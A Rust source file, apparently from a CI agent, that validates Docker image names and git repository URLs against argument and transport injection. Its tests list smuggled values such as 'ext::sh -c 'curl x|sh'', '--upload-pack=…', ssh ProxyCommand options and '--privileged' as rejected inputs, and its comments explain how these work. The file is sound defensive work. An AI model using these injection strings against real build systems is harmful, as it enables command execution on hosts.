//! Grammar for definition fields that become arguments to a process on the agent host.
//!
//! A step's `image:` is passed to `docker run`, and `workspace.repo` to `git remote add`.
//! Both are written by whoever can edit a pipeline, which is a project writer, and both
//! programs will happily read an unexpected value as an option or a transport. These checks
//! run when the pipeline compiles, so the author gets a legible error, and again on the
//! agent right before use, so a snapshot written by an older server cannot get past. The
//! agent is the boundary; the compile-time check is the courtesy.

/// A Docker image reference: `[registry[:port]/][path/]name[:tag][@algo:hex]`.
///
/// The property that matters is that nothing here can be read as a `docker run` flag or
/// as a second argument: no leading `-`, no whitespace, no shell metacharacters. The rest
/// follows the reference grammar closely enough to reject typos early.
pub fn image_reference_ok(s: &str) -> bool {
    if s.is_empty() || s.len() > 255 {
        return false;
    }
    let (name, digest) = match s.split_once('@') {
        Some((n, d)) => (n, Some(d)),
        None => (s, None),
    };
    if let Some(d) = digest {
        let Some((algo, hex)) = d.split_once(':') else {
            return false;
        };
        if algo.is_empty() || !algo.chars().all(|c| c.is_ascii_alphanumeric()) {
            return false;
        }
        if hex.len() < 32 || !hex.chars().all(|c| c.is_ascii_hexdigit()) {
            return false;
        }
    }
    if !name.starts_with(|c: char| c.is_ascii_alphanumeric()) {
        return false;
    }
    if !name
        .chars()
        .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-' | '/' | ':'))
    {
        return false;
    }
    if name.contains("//") || name.ends_with('/') || name.ends_with(':') {
        return false;
    }
    // The last path segment carries at most one `:` (the tag); a registry port is the only
    // other place a colon belongs, and that is never the last segment.
    let last = name.rsplit('/').next().unwrap_or(name);
    !last.is_empty() && last.matches(':').count() <= 1
}

/// A place `git` may fetch from: an `http(s)://`, `ssh://`, `git://`, or `file://` URL, an
/// scp-like `user@host:path`, or a filesystem path.
///
/// What is refused is anything git would treat as a transport helper or an option:
/// `ext::<command>` runs the command, `fd::<n>` reuses a descriptor, and a leading `-` on
/// the URL, a user, or a host is an argument to git or to ssh. The agent additionally pins
/// `GIT_ALLOW_PROTOCOL`, so a value this lets through still cannot reach a helper git
/// would otherwise honour.
pub fn repo_url_ok(s: &str) -> bool {
    let s = s.trim();
    if s.is_empty() || s.len() > 2048 || s.starts_with('-') {
        return false;
    }
    if s.chars().any(|c| c.is_whitespace() || c.is_control()) {
        return false;
    }
    // git reads `<helper>::<address>` as a remote-helper invocation when the run of
    // scheme characters at the very start is followed by `::`. Only that position
    // matters: the `::` inside an IPv6 literal (`https://[2001:db8::1]/repo`) is not one.
    let scheme_len = s
        .bytes()
        .take_while(|b| b.is_ascii_alphanumeric() || matches!(b, b'+' | b'.' | b'-'))
        .count();
    if s[scheme_len..].starts_with("::") {
        return false;
    }
    let authority = match s.split_once("://") {
        Some((scheme, rest)) => {
            if rest.is_empty()
                || !matches!(
                    scheme.to_ascii_lowercase().as_str(),
                    "http" | "https" | "ssh" | "git" | "file"
                )
            {
                return false;
            }
            rest.split('/').next().unwrap_or("")
        }
        // scp-like `user@host:path`, or a plain path: whatever precedes the first `/` is
        // the part git may hand to ssh.
        None => s.split('/').next().unwrap_or(""),
    };
    // Neither a user nor a host may begin with `-`: `ssh://-oProxyCommand=…@host/` is an
    // ssh option, whatever git's own guard against it does.
    !authority
        .split(['@', ':'])
        .any(|piece| piece.starts_with('-'))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn image_references_that_are_really_docker_flags_are_refused() {
        for bad in [
            "",
            "-v/:/host",
            "--privileged",
            "-it",
            "ubuntu --privileged",
            " ubuntu",
            "ubuntu:",
            "ubuntu/",
            "ubuntu:1:2",
            "reg//img",
            "img@sha256",
            "img@sha256:zz",
            "img@sha256:abc",
            "a b",
            "a;b",
            "$(x)",
        ] {
            assert!(!image_reference_ok(bad), "accepted {bad:?}");
        }
    }

    #[test]
    fn ordinary_image_references_are_accepted() {
        for good in [
            "ubuntu",
            "ubuntu:22.04",
            "rust:1.98-bookworm",
            "ghcr.io/example/fiber-agent:latest",
            "localhost:5000/team/img:dev",
            "docker.io/library/node:22-alpine",
            "img@sha256:6a1f3c0f4b9d4c3a2e1d9c8b7a6f5e4d3c2b1a0f9e8d7c6b5a4f3e2d1c0b9a8f7",
            "img:1.0@sha256:6a1f3c0f4b9d4c3a2e1d9c8b7a6f5e4d3c2b1a0f9e8d7c6b5a4f3e2d1c0b9a8f7",
            "a_b.c-d",
        ] {
            assert!(image_reference_ok(good), "rejected {good:?}");
        }
    }

    #[test]
    fn repo_urls_that_would_run_a_command_are_refused() {
        for bad in [
            "",
            "-",
            "--upload-pack=touch /tmp/x",
            "ext::sh -c 'curl x|sh'",
            "ext::sh",
            "fd::17",
            "foo::bar",
            "::x",
            "ftp://host/repo",
            "javascript://x",
            "https://host/repo with space",
            "https://host/re\npo",
            "ssh://-oProxyCommand=x@host/repo",
            "ssh://git@-oProxyCommand=x/repo",
            "-oProxyCommand=x@host:repo",
            "git@-host:repo",
        ] {
            assert!(!repo_url_ok(bad), "accepted {bad:?}");
        }
    }

    #[test]
    fn a_double_colon_that_is_not_a_helper_prefix_is_fine() {
        assert!(repo_url_ok("https://[2001:db8::1]/org/repo.git"));
        assert!(repo_url_ok("ssh://git@[fe80::1]:2222/org/repo.git"));
        assert!(repo_url_ok("https://host/path/with::colons"));
    }

    #[test]
    fn ordinary_repo_urls_are_accepted() {
        for good in [
            "https://github.com/octocat/Hello-World.git",
            "http://gitea.internal/org/repo",
            "https://user:token@github.com/org/repo.git",
            "ssh://git@github.com/org/repo.git",
            "git://host/repo.git",
            "git@github.com:org/repo.git",
            "file:///srv/git/repo.git",
            "/srv/git/repo.git",
            "./local",
        ] {
            assert!(repo_url_ok(good), "rejected {good:?}");
        }
    }
}
